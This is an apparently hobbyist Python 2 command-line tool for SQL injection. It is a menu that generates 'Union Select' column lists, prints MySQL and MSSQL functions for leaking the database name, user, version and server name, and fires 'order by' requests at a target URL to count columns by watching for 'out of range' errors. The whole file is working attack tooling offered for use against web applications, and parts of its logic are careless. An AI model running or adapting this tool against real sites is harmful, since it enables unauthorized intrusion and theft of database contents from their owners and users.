import requests
import sys
from bs4 import BeautifulSoup
import os

class Sqli:
    __version__ = '0.47'
    __author__ = 'tHe GhOsT'
    __purpose__ = 'Help in Sql injection.... for {}'.format(__author__)
    __date__ = 'Wed May 16 2018 3:26 PM'

    def dumper(self):
        url = raw_input('Enter URL: ')
        element = raw_input('Element NAME: ')
        data = requests.get(url).text
        soup = BeautifulSoup(data, 'lxml')
        elements = soup.find_all(element)
        for elem in elements:
            print ''
            print elem.text      
    def union_help(self,no_of_columns):
        clist = '1'
        for c in range(2,no_of_columns+1):
            clist += ','+str(c)
        return 'Union Select '+clist+'--'
    def mysql_commands(self):
        return '''\n
        ----------------------------------------------------------\n
        Command               Description
        ----------------------------------------------------------\n
        database()            For knowing database name.\n
        user()                For knowing username.\n
        version()             For knowing database version.\n
        concat()              For concatenation of strings.\n
        group_concat()        For concatenation of many string.\n
        Char()                For converting to ASSIC value.\n
        ----------------------------------------------------------\n

        '''
    def mssql_commands(self):
        return '''\n
        ------------------------------------------------------------\n
        Command               Description
        ------------------------------------------------------------\n
        db_name()             For knowing database name.\n
        @@version             For knowing version of database.\n
        @@servername          For knowing server name.\n
        @@spid                For knowing proccess id of programme.\n
        @@language            For knowing language of system.\n
        convert()             For converting one datatype to another.\n
        -------------------------------------------------------------\n

        '''
    def order_by_browser(self, url):
        req = requests.get(url).text
        if 'out of range' not in req:
            os.system('clear')
            print '\nCOLUMN EXIST ==> ',url
            
        else:
            print '\nAbove are total number of columns..'
            sys.exit()
    
    def order_by(self,url,ending_column):
        for e in range(1,ending_column+1):
            send = str(str(url)+' order by '+str(e))
            self.order_by_browser(send)





def he_lp():
    sqli = Sqli()
    print '''\n
    --------------------------------AUTHOR: {}--------------------------\n
    --------------------------------VERSION: {}------------------------------\n
    '''.format(sqli.__author__, sqli.__version__)
    print '[1] Mysql commands.'
    print '[2] Union help.'
    print '[3] Mssql commands.' 
    print '[4] Order By help.'
    print '[5] Dumper.'
    print '[47] Help'
    main()

def main():
    sqli =Sqli()
    choice = int(input('\nEnter your choice: '))
    if choice == 1:
        print sqli.mysql_commands()
        return main()
    if choice == 2:
        columns = int(input('Enter no. of Columns: '))
        columsn_list = sqli.union_help(columns)
        print '\n'+columsn_list
        return main()        
    if choice == 3:
        print sqli.mssql_commands()
        return main()
    if choice == 4:
        url = raw_input('\nEnter Url: ')
        ending_column = int(input('Enter no colums to check: '))
        sqli.order_by(url, ending_column)
        return main()
    if choice == 5:
        sqli.dumper()
        return main()
    
    if choice == 47:
        return he_lp()
    if choice == 0 and choice >=3:
        print 'Error'
        return he_lp()

if __name__ == '__main__':
    he_lp()
